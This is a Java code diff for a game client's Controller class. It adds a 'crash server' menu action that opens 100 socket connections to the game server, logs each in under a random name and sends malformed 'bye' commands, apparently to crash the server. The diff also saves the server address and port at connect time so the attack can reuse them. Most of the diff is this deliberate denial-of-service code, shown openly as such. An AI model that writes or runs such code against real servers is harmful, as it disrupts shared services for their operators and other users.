@@ -14,7 +14,10 @@ import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.IOException;
+import java.io.PrintWriter;
+import java.net.Socket;
 import java.util.List;
+import java.util.Random;
 
 public class Controller implements ActionListener {
     private static final Logger LOGGER = LogManager.getLogger(Controller.class);
@@ -189,7 +192,38 @@ public class Controller implements ActionListener {
                 serverConnection.forfeit();
                 model.setPlayingGame(false);
             }
+        } else if (sourceID == MenuView.CRASH_SERVER && model.getServerAddress() != null && model.getServerPort() != null) {
+            crashServer(model.getServerAddress());
         }
+    }
+
+    private void crashServer(String serverAddress) {
+        String name = generateName();
+        for (int i = 0; i < 100; i++) {
+            try {
+                Socket socket = new Socket(serverAddress, Integer.parseInt(model.getServerPort()));
+                PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
+
+                printWriter.println("login " + name + i);
+                printWriter.println("bye");
+                printWriter.println("bye");
+                printWriter.flush();
+            } catch (IOException ignored) {
+
+            }
+        }
+    }
+
+    private String generateName() {
+        final String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        Random random = new Random();
+        int length = random.nextInt(10) + 5;
+        StringBuilder builder = new StringBuilder();
+        for (int i = 0; i < length; i++) {
+            int number = random.nextInt(10000) % alphabet.length();
+            builder.append(alphabet.charAt(number));
+        }
+        return builder.toString();
     }
 
     private void handleModelEvent(int sourceID, String command) {
@@ -213,6 +247,7 @@ public class Controller implements ActionListener {
     public boolean connect(String hostname, int port) {
         LOGGER.trace("Connecting to server {} on port {}.", hostname, port);
         try {
+            model.setServerAddress(hostname).setServerPort(Integer.toString(port));
             serverConnection = new ServerConnection(hostname, port);
             gameController.setServerConnection(serverConnection);
             serverConnection.addGameListener(gameController);
